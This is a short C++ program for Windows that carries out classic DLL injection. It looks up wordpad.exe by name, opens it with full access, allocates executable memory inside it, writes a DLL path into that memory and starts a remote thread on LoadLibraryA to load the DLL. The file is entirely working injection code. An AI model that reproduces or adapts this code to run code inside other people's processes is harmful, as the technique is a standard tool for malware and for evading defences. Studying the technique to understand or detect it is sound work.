# include <iostream>
# include <Windows.h>
# include <TlHelp32.h>
# include <DbgHelp.h>

using namespace std;

int FindTargetPID(const wchar_t* procname)
{
	HANDLE pHandle;
	PROCESSENTRY32 pEntry32;
	int pid = 0;

	pHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (!pHandle) {
		cout << "[-] Failed to retrieve handle !!\n";
		return -1;
	}

	cout << "[+] Got a handle successfully !!\n";

	pEntry32.dwSize = sizeof(pEntry32);

	if (!Process32First(pHandle, &pEntry32)) {
		cout << "[+] Failed to retrieve process32 handle !!\n";
		CloseHandle(pHandle);
		return -1;
	}

	do {
		if (wcscmp(procname, pEntry32.szExeFile) == 0) {
			pid = pEntry32.th32ProcessID;
			break;
		}
	} while (Process32Next(pHandle, &pEntry32));

	return pid;
}

VOID InjectDll(int targetPID)
{

	HANDLE pHandle = NULL;
	char dllPath[] = "E:\\Dll1\\x64\\Debug\\Dll1.dll";
	LPVOID dllAddress;
	DWORD dwSize = sizeof(dllPath);

	cout << "[+] Target Process PID : " << targetPID << endl;
	
	pHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, targetPID);

	if (!pHandle) {
		cout << "[-] Failed to open target process !!\n";
		cout << GetLastError() << endl;
		CloseHandle(pHandle);
		ExitProcess(0);
	}

	dllAddress = VirtualAllocEx(pHandle, NULL, dwSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	if (!dllAddress) {
		cout << "[-] Failed to allocate memory for target process !!\n";
		cout << GetLastError() << endl;
		ExitProcess(0);
	}
	cout << "[+] Memory allocation successfull !!\n";
	cout << "[+] Dll Address : " << dllAddress << endl;

	if (WriteProcessMemory(pHandle, dllAddress, dllPath, dwSize, NULL) == 0) {
		cout << "[-] Failed to write dll in memory !!\n";
		cout << GetLastError() << endl;
		ExitProcess(0);
	}

	cout << "[+] Written dll in the target process memory !!\n";

	LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

	if (!CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, dllAddress, 0, NULL)) {
		cout << "[-] Failed to execute remote thread in memory !!\n";
		cout << GetLastError() << endl;
		ExitProcess(0);
	}

	WaitForSingleObject(pHandle, 3000);
}

int main()
{
	int pid = FindTargetPID(L"wordpad.exe");

	if (pid == -1) {
		return -1;
	}

	InjectDll(pid);

	return 0;
}